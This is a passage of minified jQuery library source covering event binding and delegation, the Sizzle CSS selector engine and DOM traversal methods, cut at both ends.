                    $.test(t.nodeName) && !v._data(t, "_change_attached") && (v.event.add(t, "change._change", function (e) {
                        this.parentNode && !e.isSimulated && !e.isTrigger && v.event.simulate("change", this.parentNode, e, !0)
                    }), v._data(t, "_change_attached", !0))
                })
            },
            handle: function (e) {
                var t = e.target;
                if (this !== t || e.isSimulated || e.isTrigger || t.type !== "radio" && t.type !== "checkbox") return e.handleObj.handler.apply(this, arguments)
            },
            teardown: function () {
                return v.event.remove(this, "._change"), !$.test(this.nodeName)
            }
        }), v.support.focusinBubbles || v.each({
            focus: "focusin",
            blur: "focusout"
        }, function (e, t) {
            var n = 0,
                r = function (e) {
                    v.event.simulate(t, e.target, v.event.fix(e), !0)
                };
            v.event.special[t] = {
                setup: function () {
                    n++ === 0 && i.addEventListener(e, r, !0)
                },
                teardown: function () {
                    --n === 0 && i.removeEventListener(e, r, !0)
                }
            }
        }), v.fn.extend({
            on: function (e, n, r, i, s) {
                var o, u;
                if (typeof e == "object") {
                    typeof n != "string" && (r = r || n, n = t);
                    for (u in e) this.on(u, n, r, e[u], s);
                    return this
                }
                r == null && i == null ? (i = n, r = n = t) : i == null && (typeof n == "string" ? (i = r, r = t) : (i = r, r = n, n = t));
                if (i === !1) i = et;
                else if (!i) return this;
                return s === 1 && (o = i, i = function (e) {
                    return v().off(e), o.apply(this, arguments)
                }, i.guid = o.guid || (o.guid = v.guid++)), this.each(function () {
                    v.event.add(this, e, i, r, n)
                })
            },
            one: function (e, t, n, r) {
                return this.on(e, t, n, r, 1)
            },
            off: function (e, n, r) {
                var i, s;
                if (e && e.preventDefault && e.handleObj) return i = e.handleObj, v(e.delegateTarget).off(i.namespace ? i.origType + "." + i.namespace : i.origType, i.selector, i.handler), this;
                if (typeof e == "object") {
                    for (s in e) this.off(s, n, e[s]);
                    return this
                }
                if (n === !1 || typeof n == "function") r = n, n = t;
                return r === !1 && (r = et), this.each(function () {
                    v.event.remove(this, e, r, n)
                })
            },
            bind: function (e, t, n) {
                return this.on(e, null, t, n)
            },
            unbind: function (e, t) {
                return this.off(e, null, t)
            },
            live: function (e, t, n) {
                return v(this.context).on(e, this.selector, t, n), this
            },
            die: function (e, t) {
                return v(this.context).off(e, this.selector || "**", t), this
            },
            delegate: function (e, t, n, r) {
                return this.on(t, e, n, r)
            },
            undelegate: function (e, t, n) {
                return arguments.length === 1 ? this.off(e, "**") : this.off(t, e || "**", n)
            },
            trigger: function (e, t) {
                return this.each(function () {
                    v.event.trigger(e, t, this)
                })
            },
            triggerHandler: function (e, t) {
                if (this[0]) return v.event.trigger(e, t, this[0], !0)
            },
            toggle: function (e) {
                var t = arguments,
                    n = e.guid || v.guid++,
                    r = 0,
                    i = function (n) {
                        var i = (v._data(this, "lastToggle" + e.guid) || 0) % r;
                        return v._data(this, "lastToggle" + e.guid, i + 1), n.preventDefault(), t[i].apply(this, arguments) || !1
                    };
                i.guid = n;
                while (r < t.length) t[r++].guid = n;
                return this.click(i)
            },
            hover: function (e, t) {
                return this.mouseenter(e).mouseleave(t || e)
            }
        }), v.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "), function (e, t) {
            v.fn[t] = function (e, n) {
                return n == null && (n = e, e = null), arguments.length > 0 ? this.on(t, null, e, n) : this.trigger(t)
            }, Q.test(t) && (v.event.fixHooks[t] = v.event.keyHooks), G.test(t) && (v.event.fixHooks[t] = v.event.mouseHooks)
        }),
        function (e, t) {
            function nt(e, t, n, r) {
                n = n || [], t = t || g;
                var i, s, a, f, l = t.nodeType;
                if (!e || typeof e != "string") return n;
                if (l !== 1 && l !== 9) return [];
                a = o(t);
                if (!a && !r)
                    if (i = R.exec(e))
                        if (f = i[1]) {
                            if (l === 9) {
                                s = t.getElementById(f);
                                if (!s || !s.parentNode) return n;
                                if (s.id === f) return n.push(s), n
                            } else if (t.ownerDocument && (s = t.ownerDocument.getElementById(f)) && u(t, s) && s.id === f) return n.push(s), n
                        } else {
                            if (i[2]) return S.apply(n, x.call(t.getElementsByTagName(e), 0)), n;
                            if ((f = i[3]) && Z && t.getElementsByClassName) return S.apply(n, x.call(t.getElementsByClassName(f), 0)), n
                        }
                return vt(e.replace(j, "$1"), t, n, r, a)
            }

            function rt(e) {
                return function (t) {
                    var n = t.nodeName.toLowerCase();
                    return n === "input" && t.type === e
                }
            }

            function it(e) {
                return function (t) {
                    var n = t.nodeName.toLowerCase();
                    return (n === "input" || n === "button") && t.type === e
                }
            }

            function st(e) {
                return N(function (t) {
                    return t = +t, N(function (n, r) {
                        var i, s = e([], n.length, t),
                            o = s.length;
                        while (o--) n[i = s[o]] && (n[i] = !(r[i] = n[i]))
                    })
                })
            }

            function ot(e, t, n) {
                if (e === t) return n;
                var r = e.nextSibling;
                while (r) {
                    if (r === t) return -1;
                    r = r.nextSibling
                }
                return 1
            }

            function ut(e, t) {
                var n, r, s, o, u, a, f, l = L[d][e];
                if (l) return t ? 0 : l.slice(0);
                u = e, a = [], f = i.preFilter;
                while (u) {
                    if (!n || (r = F.exec(u))) r && (u = u.slice(r[0].length)), a.push(s = []);
                    n = !1;
                    if (r = I.exec(u)) s.push(n = new m(r.shift())), u = u.slice(n.length), n.type = r[0].replace(j, " ");
                    for (o in i.filter)(r = J[o].exec(u)) && (!f[o] || (r = f[o](r, g, !0))) && (s.push(n = new m(r.shift())), u = u.slice(n.length), n.type = o, n.matches = r);
                    if (!n) break
                }
                return t ? u.length : u ? nt.error(e) : L(e, a).slice(0)
            }

            function at(e, t, r) {
                var i = t.dir,
                    s = r && t.dir === "parentNode",
                    o = w++;
                return t.first ? function (t, n, r) {
                    while (t = t[i])
                        if (s || t.nodeType === 1) return e(t, n, r)
                } : function (t, r, u) {
                    if (!u) {
                        var a, f = b + " " + o + " ",
                            l = f + n;
                        while (t = t[i])
                            if (s || t.nodeType === 1) {
                                if ((a = t[d]) === l) return t.sizset;
                                if (typeof a == "string" && a.indexOf(f) === 0) {
                                    if (t.sizset) return t
                                } else {
                                    t[d] = l;
                                    if (e(t, r, u)) return t.sizset = !0, t;
                                    t.sizset = !1
                                }
                            }
                    } else
                        while (t = t[i])
                            if (s || t.nodeType === 1)
                                if (e(t, r, u)) return t
                }
            }

            function ft(e) {
                return e.length > 1 ? function (t, n, r) {
                    var i = e.length;
                    while (i--)
                        if (!e[i](t, n, r)) return !1;
                    return !0
                } : e[0]
            }

            function lt(e, t, n, r, i) {
                var s, o = [],
                    u = 0,
                    a = e.length,
                    f = t != null;
                for (; u < a; u++)
                    if (s = e[u])
                        if (!n || n(s, r, i)) o.push(s), f && t.push(u);
                return o
            }

            function ct(e, t, n, r, i, s) {
                return r && !r[d] && (r = ct(r)), i && !i[d] && (i = ct(i, s)), N(function (s, o, u, a) {
                    if (s && i) return;
                    var f, l, c, h = [],
                        p = [],
                        d = o.length,
                        v = s || dt(t || "*", u.nodeType ? [u] : u, [], s),
                        m = e && (s || !t) ? lt(v, h, e, u, a) : v,
                        g = n ? i || (s ? e : d || r) ? [] : o : m;
                    n && n(m, g, u, a);
                    if (r) {
                        c = lt(g, p), r(c, [], u, a), f = c.length;
                        while (f--)
                            if (l = c[f]) g[p[f]] = !(m[p[f]] = l)
                    }
                    if (s) {
                        f = e && g.length;
                        while (f--)
                            if (l = g[f]) s[h[f]] = !(o[h[f]] = l)
                    } else g = lt(g === o ? g.splice(d, g.length) : g), i ? i(null, o, g, a) : S.apply(o, g)
                })
            }

            function ht(e) {
                var t, n, r, s = e.length,
                    o = i.relative[e[0].type],
                    u = o || i.relative[" "],
                    a = o ? 1 : 0,
                    f = at(function (e) {
                        return e === t
                    }, u, !0),
                    l = at(function (e) {
                        return T.call(t, e) > -1
                    }, u, !0),
                    h = [
                        function (e, n, r) {
                            return !o && (r || n !== c) || ((t = n).nodeType ? f(e, n, r) : l(e, n, r))
                        }
                    ];
                for (; a < s; a++)
                    if (n = i.relative[e[a].type]) h = [at(ft(h), n)];
                    else {
                        n = i.filter[e[a].type].apply(null, e[a].matches);
                        if (n[d]) {
                            r = ++a;
                            for (; r < s; r++)
                                if (i.relative[e[r].type]) break;
                            return ct(a > 1 && ft(h), a > 1 && e.slice(0, a - 1).join("").replace(j, "$1"), n, a < r && ht(e.slice(a, r)), r < s && ht(e = e.slice(r)), r < s && e.join(""))
                        }
                        h.push(n)
                    }
                return ft(h)
            }

            function pt(e, t) {
                var r = t.length > 0,
                    s = e.length > 0,
                    o = function (u, a, f, l, h) {
                        var p, d, v, m = [],
                            y = 0,
                            w = "0",
                            x = u && [],
                            T = h != null,
                            N = c,
                            C = u || s && i.find.TAG("*", h && a.parentNode || a),
                            k = b += N == null ? 1 : Math.E;
                        T && (c = a !== g && a, n = o.el);
                        for (;
                            (p = C[w]) != null; w++) {
                            if (s && p) {
                                for (d = 0; v = e[d]; d++)
                                    if (v(p, a, f)) {
                                        l.push(p);
                                        break
                                    }
                                T && (b = k, n = ++o.el)
                            }
                            r && ((p = !v && p) && y--, u && x.push(p))
                        }
                        y += w;
                        if (r && w !== y) {
                            for (d = 0; v = t[d]; d++) v(x, m, a, f);
                            if (u) {
                                if (y > 0)
                                    while (w--)!x[w] && !m[w] && (m[w] = E.call(l));
                                m = lt(m)
                            }
                            S.apply(l, m), T && !u && m.length > 0 && y + t.length > 1 && nt.uniqueSort(l)
                        }
                        return T && (b = k, c = N), x
                    };
                return o.el = 0, r ? N(o) : o
            }

            function dt(e, t, n, r) {
                var i = 0,
                    s = t.length;
                for (; i < s; i++) nt(e, t[i], n, r);
                return n
            }

            function vt(e, t, n, r, s) {
                var o, u, f, l, c, h = ut(e),
                    p = h.length;
                if (!r && h.length === 1) {
                    u = h[0] = h[0].slice(0);
                    if (u.length > 2 && (f = u[0]).type === "ID" && t.nodeType === 9 && !s && i.relative[u[1].type]) {
                        t = i.find.ID(f.matches[0].replace($, ""), t, s)[0];
                        if (!t) return n;
                        e = e.slice(u.shift().length)
                    }
                    for (o = J.POS.test(e) ? -1 : u.length - 1; o >= 0; o--) {
                        f = u[o];
                        if (i.relative[l = f.type]) break;
                        if (c = i.find[l])
                            if (r = c(f.matches[0].replace($, ""), z.test(u[0].type) && t.parentNode || t, s)) {
                                u.splice(o, 1), e = r.length && u.join("");
                                if (!e) return S.apply(n, x.call(r, 0)), n;
                                break
                            }
                    }
                }
                return a(e, h)(r, t, s, n, z.test(e)), n
            }

            function mt() {}
            var n, r, i, s, o, u, a, f, l, c, h = !0,
                p = "undefined",
                d = ("sizcache" + Math.random()).replace(".", ""),
                m = String,
                g = e.document,
                y = g.documentElement,
                b = 0,
                w = 0,
                E = [].pop,
                S = [].push,
                x = [].slice,
                T = [].indexOf || function (e) {
                    var t = 0,
                        n = this.length;
                    for (; t < n; t++)
                        if (this[t] === e) return t;
                    return -1
                }, N = function (e, t) {
                    return e[d] = t == null || t, e
                }, C = function () {
                    var e = {}, t = [];
                    return N(function (n, r) {
                        return t.push(n) > i.cacheLength && delete e[t.shift()], e[n] = r
                    }, e)
                }, k = C(),
                L = C(),
                A = C(),
                O = "[\\x20\\t\\r\\n\\f]",
                M = "(?:\\\\.|[-\\w]|[^\\x00-\\xa0])+",
                _ = M.replace("w", "w#"),
                D = "([*^$|!~]?=)",
                P = "\\[" + O + "*(" + M + ")" + O + "*(?:" + D + O + "*(?:(['\"])((?:\\\\.|[^\\\\])*?)\\3|(" + _ + ")|)|)" + O + "*\\]",
                H = ":(" + M + ")(?:\\((?:(['\"])((?:\\\\.|[^\\\\])*?)\\2|([^()[\\]]*|(?:(?:" + P + ")|[^:]|\\\\.)*|.*))\\)|)",
                B = ":(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + O + "*((?:-\\d)?\\d*)" + O + "*\\)|)(?=[^-]|$)",
                j = new RegExp("^" + O + "+|((?:^|[^\\\\])(?:\\\\.)*)" + O + "+$", "g"),
                F = new RegExp("^" + O + "*," + O + "*"),
                I = new RegExp("^" + O + "*([\\x20\\t\\r\\n\\f>+~])" + O + "*"),
                q = new RegExp(H),
                R = /^(?:#([\w\-]+)|(\w+)|\.([\w\-]+))$/,
                U = /^:not/,
                z = /[\x20\t\r\n\f]*[+~]/,
                W = /:not\($/,
                X = /h\d/i,
                V = /input|select|textarea|button/i,
                $ = /\\(?!\\)/g,
                J = {
                    ID: new RegExp("^#(" + M + ")"),
                    CLASS: new RegExp("^\\.(" + M + ")"),
                    NAME: new RegExp("^\\[name=['\"]?(" + M + ")['\"]?\\]"),
                    TAG: new RegExp("^(" + M.replace("w", "w*") + ")"),
                    ATTR: new RegExp("^" + P),
                    PSEUDO: new RegExp("^" + H),
                    POS: new RegExp(B, "i"),
                    CHILD: new RegExp("^:(only|nth|first|last)-child(?:\\(" + O + "*(even|odd|(([+-]|)(\\d*)n|)" + O + "*(?:([+-]|)" + O + "*(\\d+)|))" + O + "*\\)|)", "i"),
                    needsContext: new RegExp("^" + O + "*[>+~]|" + B, "i")
                }, K = function (e) {
                    var t = g.createElement("div");
                    try {
                        return e(t)
                    } catch (n) {
                        return !1
                    } finally {
                        t = null
                    }
                }, Q = K(function (e) {
                    return e.appendChild(g.createComment("")), !e.getElementsByTagName("*").length
                }),
                G = K(function (e) {
                    return e.innerHTML = "<a href='#'></a>", e.firstChild && typeof e.firstChild.getAttribute !== p && e.firstChild.getAttribute("href") === "#"
                }),
                Y = K(function (e) {
                    e.innerHTML = "<select></select>";
                    var t = typeof e.lastChild.getAttribute("multiple");
                    return t !== "boolean" && t !== "string"
                }),
                Z = K(function (e) {
                    return e.innerHTML = "<div class='hidden e'></div><div class='hidden'></div>", !e.getElementsByClassName || !e.getElementsByClassName("e").length ? !1 : (e.lastChild.className = "e", e.getElementsByClassName("e").length === 2)
                }),
                et = K(function (e) {
                    e.id = d + 0, e.innerHTML = "<a name='" + d + "'></a><div name='" + d + "'></div>", y.insertBefore(e, y.firstChild);
                    var t = g.getElementsByName && g.getElementsByName(d).length === 2 + g.getElementsByName(d + 0).length;
                    return r = !g.getElementById(d), y.removeChild(e), t
                });
            try {
                x.call(y.childNodes, 0)[0].nodeType
            } catch (tt) {
                x = function (e) {
                    var t, n = [];
                    for (; t = this[e]; e++) n.push(t);
                    return n
                }
            }
            nt.matches = function (e, t) {
                return nt(e, null, null, t)
            }, nt.matchesSelector = function (e, t) {
                return nt(t, null, null, [e]).length > 0
            }, s = nt.getText = function (e) {
                var t, n = "",
                    r = 0,
                    i = e.nodeType;
                if (i) {
                    if (i === 1 || i === 9 || i === 11) {
                        if (typeof e.textContent == "string") return e.textContent;
                        for (e = e.firstChild; e; e = e.nextSibling) n += s(e)
                    } else if (i === 3 || i === 4) return e.nodeValue
                } else
                    for (; t = e[r]; r++) n += s(t);
                return n
            }, o = nt.isXML = function (e) {
                var t = e && (e.ownerDocument || e).documentElement;
                return t ? t.nodeName !== "HTML" : !1
            }, u = nt.contains = y.contains ? function (e, t) {
                var n = e.nodeType === 9 ? e.documentElement : e,
                    r = t && t.parentNode;
                return e === r || !! (r && r.nodeType === 1 && n.contains && n.contains(r))
            } : y.compareDocumentPosition ? function (e, t) {
                return t && !! (e.compareDocumentPosition(t) & 16)
            } : function (e, t) {
                while (t = t.parentNode)
                    if (t === e) return !0;
                return !1
            }, nt.attr = function (e, t) {
                var n, r = o(e);
                return r || (t = t.toLowerCase()), (n = i.attrHandle[t]) ? n(e) : r || Y ? e.getAttribute(t) : (n = e.getAttributeNode(t), n ? typeof e[t] == "boolean" ? e[t] ? t : null : n.specified ? n.value : null : null)
            }, i = nt.selectors = {
                cacheLength: 50,
                createPseudo: N,
                match: J,
                attrHandle: G ? {} : {
                    href: function (e) {
                        return e.getAttribute("href", 2)
                    },
                    type: function (e) {
                        return e.getAttribute("type")
                    }
                },
                find: {
                    ID: r ? function (e, t, n) {
                        if (typeof t.getElementById !== p && !n) {
                            var r = t.getElementById(e);
                            return r && r.parentNode ? [r] : []
                        }
                    } : function (e, n, r) {
                        if (typeof n.getElementById !== p && !r) {
                            var i = n.getElementById(e);
                            return i ? i.id === e || typeof i.getAttributeNode !== p && i.getAttributeNode("id").value === e ? [i] : t : []
                        }
                    },
                    TAG: Q ? function (e, t) {
                        if (typeof t.getElementsByTagName !== p) return t.getElementsByTagName(e)
                    } : function (e, t) {
                        var n = t.getElementsByTagName(e);
                        if (e === "*") {
                            var r, i = [],
                                s = 0;
                            for (; r = n[s]; s++) r.nodeType === 1 && i.push(r);
                            return i
                        }
                        return n
                    },
                    NAME: et && function (e, t) {
                        if (typeof t.getElementsByName !== p) return t.getElementsByName(name)
                    },
                    CLASS: Z && function (e, t, n) {
                        if (typeof t.getElementsByClassName !== p && !n) return t.getElementsByClassName(e)
                    }
                },
                relative: {
                    ">": {
                        dir: "parentNode",
                        first: !0
                    },
                    " ": {
                        dir: "parentNode"
                    },
                    "+": {
                        dir: "previousSibling",
                        first: !0
                    },
                    "~": {
                        dir: "previousSibling"
                    }
                },
                preFilter: {
                    ATTR: function (e) {
                        return e[1] = e[1].replace($, ""), e[3] = (e[4] || e[5] || "").replace($, ""), e[2] === "~=" && (e[3] = " " + e[3] + " "), e.slice(0, 4)
                    },
                    CHILD: function (e) {
                        return e[1] = e[1].toLowerCase(), e[1] === "nth" ? (e[2] || nt.error(e[0]), e[3] = +(e[3] ? e[4] + (e[5] || 1) : 2 * (e[2] === "even" || e[2] === "odd")), e[4] = +(e[6] + e[7] || e[2] === "odd")) : e[2] && nt.error(e[0]), e
                    },
                    PSEUDO: function (e) {
                        var t, n;
                        if (J.CHILD.test(e[0])) return null;
                        if (e[3]) e[2] = e[3];
                        else if (t = e[4]) q.test(t) && (n = ut(t, !0)) && (n = t.indexOf(")", t.length - n) - t.length) && (t = t.slice(0, n), e[0] = e[0].slice(0, n)), e[2] = t;
                        return e.slice(0, 3)
                    }
                },
                filter: {
                    ID: r ? function (e) {
                        return e = e.replace($, ""),
                        function (t) {
                            return t.getAttribute("id") === e
                        }
                    } : function (e) {
                        return e = e.replace($, ""),
                        function (t) {
                            var n = typeof t.getAttributeNode !== p && t.getAttributeNode("id");
                            return n && n.value === e
                        }
                    },
                    TAG: function (e) {
                        return e === "*" ? function () {
                            return !0
                        } : (e = e.replace($, "").toLowerCase(), function (t) {
                            return t.nodeName && t.nodeName.toLowerCase() === e
                        })
                    },
                    CLASS: function (e) {
                        var t = k[d][e];
                        return t || (t = k(e, new RegExp("(^|" + O + ")" + e + "(" + O + "|$)"))),
                        function (e) {
                            return t.test(e.className || typeof e.getAttribute !== p && e.getAttribute("class") || "")
                        }
                    },
                    ATTR: function (e, t, n) {
                        return function (r, i) {
                            var s = nt.attr(r, e);
                            return s == null ? t === "!=" : t ? (s += "", t === "=" ? s === n : t === "!=" ? s !== n : t === "^=" ? n && s.indexOf(n) === 0 : t === "*=" ? n && s.indexOf(n) > -1 : t === "$=" ? n && s.substr(s.length - n.length) === n : t === "~=" ? (" " + s + " ").indexOf(n) > -1 : t === "|=" ? s === n || s.substr(0, n.length + 1) === n + "-" : !1) : !0
                        }
                    },
                    CHILD: function (e, t, n, r) {
                        return e === "nth" ? function (e) {
                            var t, i, s = e.parentNode;
                            if (n === 1 && r === 0) return !0;
                            if (s) {
                                i = 0;
                                for (t = s.firstChild; t; t = t.nextSibling)
                                    if (t.nodeType === 1) {
                                        i++;
                                        if (e === t) break
                                    }
                            }
                            return i -= r, i === n || i % n === 0 && i / n >= 0
                        } : function (t) {
                            var n = t;
                            switch (e) {
                            case "only":
                            case "first":
                                while (n = n.previousSibling)
                                    if (n.nodeType === 1) return !1;
                                if (e === "first") return !0;
                                n = t;
                            case "last":
                                while (n = n.nextSibling)
                                    if (n.nodeType === 1) return !1;
                                return !0
                            }
                        }
                    },
                    PSEUDO: function (e, t) {
                        var n, r = i.pseudos[e] || i.setFilters[e.toLowerCase()] || nt.error("unsupported pseudo: " + e);
                        return r[d] ? r(t) : r.length > 1 ? (n = [e, e, "", t], i.setFilters.hasOwnProperty(e.toLowerCase()) ? N(function (e, n) {
                            var i, s = r(e, t),
                                o = s.length;
                            while (o--) i = T.call(e, s[o]), e[i] = !(n[i] = s[o])
                        }) : function (e) {
                            return r(e, 0, n)
                        }) : r
                    }
                },
                pseudos: {
                    not: N(function (e) {
                        var t = [],
                            n = [],
                            r = a(e.replace(j, "$1"));
                        return r[d] ? N(function (e, t, n, i) {
                            var s, o = r(e, null, i, []),
                                u = e.length;
                            while (u--)
                                if (s = o[u]) e[u] = !(t[u] = s)
                        }) : function (e, i, s) {
                            return t[0] = e, r(t, null, s, n), !n.pop()
                        }
                    }),
                    has: N(function (e) {
                        return function (t) {
                            return nt(e, t).length > 0
                        }
                    }),
                    contains: N(function (e) {
                        return function (t) {
                            return (t.textContent || t.innerText || s(t)).indexOf(e) > -1
                        }
                    }),
                    enabled: function (e) {
                        return e.disabled === !1
                    },
                    disabled: function (e) {
                        return e.disabled === !0
                    },
                    checked: function (e) {
                        var t = e.nodeName.toLowerCase();
                        return t === "input" && !! e.checked || t === "option" && !! e.selected
                    },
                    selected: function (e) {
                        return e.parentNode && e.parentNode.selectedIndex, e.selected === !0
                    },
                    parent: function (e) {
                        return !i.pseudos.empty(e)
                    },
                    empty: function (e) {
                        var t;
                        e = e.firstChild;
                        while (e) {
                            if (e.nodeName > "@" || (t = e.nodeType) === 3 || t === 4) return !1;
                            e = e.nextSibling
                        }
                        return !0
                    },
                    header: function (e) {
                        return X.test(e.nodeName)
                    },
                    text: function (e) {
                        var t, n;
                        return e.nodeName.toLowerCase() === "input" && (t = e.type) === "text" && ((n = e.getAttribute("type")) == null || n.toLowerCase() === t)
                    },
                    radio: rt("radio"),
                    checkbox: rt("checkbox"),
                    file: rt("file"),
                    password: rt("password"),
                    image: rt("image"),
                    submit: it("submit"),
                    reset: it("reset"),
                    button: function (e) {
                        var t = e.nodeName.toLowerCase();
                        return t === "input" && e.type === "button" || t === "button"
                    },
                    input: function (e) {
                        return V.test(e.nodeName)
                    },
                    focus: function (e) {
                        var t = e.ownerDocument;
                        return e === t.activeElement && (!t.hasFocus || t.hasFocus()) && ( !! e.type || !! e.href)
                    },
                    active: function (e) {
                        return e === e.ownerDocument.activeElement
                    },
                    first: st(function (e, t, n) {
                        return [0]
                    }),
                    last: st(function (e, t, n) {
                        return [t - 1]
                    }),
                    eq: st(function (e, t, n) {
                        return [n < 0 ? n + t : n]
                    }),
                    even: st(function (e, t, n) {
                        for (var r = 0; r < t; r += 2) e.push(r);
                        return e
                    }),
                    odd: st(function (e, t, n) {
                        for (var r = 1; r < t; r += 2) e.push(r);
                        return e
                    }),
                    lt: st(function (e, t, n) {
                        for (var r = n < 0 ? n + t : n; --r >= 0;) e.push(r);
                        return e
                    }),
                    gt: st(function (e, t, n) {
                        for (var r = n < 0 ? n + t : n; ++r < t;) e.push(r);
                        return e
                    })
                }
            }, f = y.compareDocumentPosition ? function (e, t) {
                return e === t ? (l = !0, 0) : (!e.compareDocumentPosition || !t.compareDocumentPosition ? e.compareDocumentPosition : e.compareDocumentPosition(t) & 4) ? -1 : 1
            } : function (e, t) {
                if (e === t) return l = !0, 0;
                if (e.sourceIndex && t.sourceIndex) return e.sourceIndex - t.sourceIndex;
                var n, r, i = [],
                    s = [],
                    o = e.parentNode,
                    u = t.parentNode,
                    a = o;
                if (o === u) return ot(e, t);
                if (!o) return -1;
                if (!u) return 1;
                while (a) i.unshift(a), a = a.parentNode;
                a = u;
                while (a) s.unshift(a), a = a.parentNode;
                n = i.length, r = s.length;
                for (var f = 0; f < n && f < r; f++)
                    if (i[f] !== s[f]) return ot(i[f], s[f]);
                return f === n ? ot(e, s[f], -1) : ot(i[f], t, 1)
            }, [0, 0].sort(f), h = !l, nt.uniqueSort = function (e) {
                var t, n = 1;
                l = h, e.sort(f);
                if (l)
                    for (; t = e[n]; n++) t === e[n - 1] && e.splice(n--, 1);
                return e
            }, nt.error = function (e) {
                throw new Error("Syntax error, unrecognized expression: " + e)
            }, a = nt.compile = function (e, t) {
                var n, r = [],
                    i = [],
                    s = A[d][e];
                if (!s) {
                    t || (t = ut(e)), n = t.length;
                    while (n--) s = ht(t[n]), s[d] ? r.push(s) : i.push(s);
                    s = A(e, pt(i, r))
                }
                return s
            }, g.querySelectorAll && function () {
                var e, t = vt,
                    n = /'|\\/g,
                    r = /\=[\x20\t\r\n\f]*([^'"\]]*)[\x20\t\r\n\f]*\]/g,
                    i = [":focus"],
                    s = [":active", ":focus"],
                    u = y.matchesSelector || y.mozMatchesSelector || y.webkitMatchesSelector || y.oMatchesSelector || y.msMatchesSelector;
                K(function (e) {
                    e.innerHTML = "<select><option selected=''></option></select>", e.querySelectorAll("[selected]").length || i.push("\\[" + O + "*(?:checked|disabled|ismap|multiple|readonly|selected|value)"), e.querySelectorAll(":checked").length || i.push(":checked")
                }), K(function (e) {
                    e.innerHTML = "<p test=''></p>", e.querySelectorAll("[test^='']").length && i.push("[*^$]=" + O + "*(?:\"\"|'')"), e.innerHTML = "<input type='hidden'/>", e.querySelectorAll(":enabled").length || i.push(":enabled", ":disabled")
                }), i = new RegExp(i.join("|")), vt = function (e, r, s, o, u) {
                    if (!o && !u && (!i || !i.test(e))) {
                        var a, f, l = !0,
                            c = d,
                            h = r,
                            p = r.nodeType === 9 && e;
                        if (r.nodeType === 1 && r.nodeName.toLowerCase() !== "object") {
                            a = ut(e), (l = r.getAttribute("id")) ? c = l.replace(n, "\\$&") : r.setAttribute("id", c), c = "[id='" + c + "'] ", f = a.length;
                            while (f--) a[f] = c + a[f].join("");
                            h = z.test(e) && r.parentNode || r, p = a.join(",")
                        }
                        if (p) try {
                            return S.apply(s, x.call(h.querySelectorAll(p), 0)), s
                        } catch (v) {} finally {
                            l || r.removeAttribute("id")
                        }
                    }
                    return t(e, r, s, o, u)
                }, u && (K(function (t) {
                    e = u.call(t, "div");
                    try {
                        u.call(t, "[test!='']:sizzle"), s.push("!=", H)
                    } catch (n) {}
                }), s = new RegExp(s.join("|")), nt.matchesSelector = function (t, n) {
                    n = n.replace(r, "='$1']");
                    if (!o(t) && !s.test(n) && (!i || !i.test(n))) try {
                        var a = u.call(t, n);
                        if (a || e || t.document && t.document.nodeType !== 11) return a
                    } catch (f) {}
                    return nt(n, null, null, [t]).length > 0
                })
            }(), i.pseudos.nth = i.pseudos.eq, i.filters = mt.prototype = i.pseudos, i.setFilters = new mt, nt.attr = v.attr, v.find = nt, v.expr = nt.selectors, v.expr[":"] = v.expr.pseudos, v.unique = nt.uniqueSort, v.text = nt.getText, v.isXMLDoc = nt.isXML, v.contains = nt.contains
        }(e);
        var nt = /Until$/,
            rt = /^(?:parents|prev(?:Until|All))/,
            it = /^.[^:#\[\.,]*$/,
            st = v.expr.match.needsContext,
            ot = {
                children: !0,
                contents: !0,
                next: !0,
                prev: !0
            };
        v.fn.extend({
            find: function (e) {
                var t, n, r, i, s, o, u = this;
                if (typeof e != "string") return v(e).filter(function () {
                    for (t = 0, n = u.length; t < n; t++)
                        if (v.contains(u[t], this)) return !0
                });
                o = this.pushStack("", "find", e);
                for (t = 0, n = this.length; t < n; t++) {
                    r = o.length, v.find(e, this[t], o);
                    if (t > 0)
                        for (i = r; i < o.length; i++)
                            for (s = 0; s < r; s++)
                                if (o[s] === o[i]) {
                                    o.splice(i--, 1);
                                    break
                                }
                }
                return o
            },
            has: function (e) {
                var t, n = v(e, this),
                    r = n.length;
                return this.filter(function () {
                    for (t = 0; t < r; t++)
                        if (v.contains(this, n[t])) return !0
                })
            },
            not: function (e) {
                return this.pushStack(ft(this, e, !1), "not", e)
            },
            filter: function (e) {
                return this.pushStack(ft(this, e, !0), "filter", e)
            },
            is: function (e) {
                return !!e && (typeof e == "string" ? st.test(e) ? v(e, this.context).index(this[0]) >= 0 : v.filter(e, this).length > 0 : this.filter(e).length > 0)
            },
            closest: function (e, t) {
                var n, r = 0,
                    i = this.length,
                    s = [],
                    o = st.test(e) || typeof e != "string" ? v(e, t || this.context) : 0;
                for (; r < i; r++) {
                    n = this[r];
                    while (n && n.ownerDocument && n !== t && n.nodeType !== 11) {
                        if (o ? o.index(n) > -1 : v.find.matchesSelector(n, e)) {
                            s.push(n);
                            break
                        }
                        n = n.parentNode
                    }
                }
                return s = s.length > 1 ? v.unique(s) : s, this.pushStack(s, "closest", e)
            },
            index: function (e) {
                return e ? typeof e == "string" ? v.inArray(this[0], v(e)) : v.inArray(e.jquery ? e[0] : e, this) : this[0] && this[0].parentNode ? this.prevAll().length : -1
            },
            add: function (e, t) {
                var n = typeof e == "string" ? v(e, t) : v.makeArray(e && e.nodeType ? [e] : e),
                    r = v.merge(this.get(), n);
                return this.pushStack(ut(n[0]) || ut(r[0]) ? r : v.unique(r))
            },
            addBack: function (e) {
                return this.add(e == null ? this.prevObject : this.prevObject.filter(e))
            }
        }), v.fn.andSelf = v.fn.addBack, v.each({
            parent: function (e) {
                var t = e.parentNode;
                return t && t.nodeType !== 11 ? t : null
            },
            parents: function (e) {
                return v.dir(e, "parentNode")
            },
            parentsUntil: function (e, t, n) {
                return v.dir(e, "parentNode", n)
            },
            next: function (e) {
                return at(e, "nextSibling")
            },
            prev: function (e) {
                return at(e, "previousSibling")
            },
            nextAll: function (e) {
                return v.dir(e, "nextSibling")
            },
            prevAll: function (e) {
                return v.dir(e, "previousSibling")
            },
            nextUntil: function (e, t, n) {
                return v.dir(e, "nextSibling", n)
            },
            prevUntil: function (e, t, n) {
                return v.dir(e, "previousSibling", n)
            },
            siblings: function (e) {
                return v.sibling((e.parentNode || {}).firstChild, e)
            },
            children: function (e) {
                return v.sibling(e.firstChild)
            },
            contents: function (e) {
                return v.nodeName(e, "iframe") ? e.contentDocument || e.contentWindow.document : v.merge([], e.childNodes)
            }
        }, function (e, t) {
